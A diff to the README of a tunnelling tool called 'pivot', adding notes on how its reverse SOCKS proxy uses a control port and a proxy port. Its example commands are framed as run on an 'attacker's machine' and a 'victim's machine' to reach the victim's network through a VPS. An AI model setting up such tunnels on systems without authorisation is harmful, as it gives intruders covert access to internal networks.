@@ -243,12 +243,18 @@ Reverse socks proxy
 ```bash
 # on attacker's machine
 ./pivot proxy -l 7777 -l 8888
+# The first -l specifies the control port
+# The second -l specifies the proxy port
 
 # on victim's machine
 ./pivot proxy -r vps:7777
 
 # now attacker can use socks proxy on vps:8888
 ```
+
+The port 7777 in the above example is called the control port, which uses TCP multiplexing technology to ensure that multiple TCP streams (i.e., multiple socks proxy requests) can be processed within a single TCP long connection.
+
+Therefore, the order of ports 7777 and 8888 **cannot be reversed**
 
 To enable authentication, simply add `user:pass` after the `-a` flag.
 
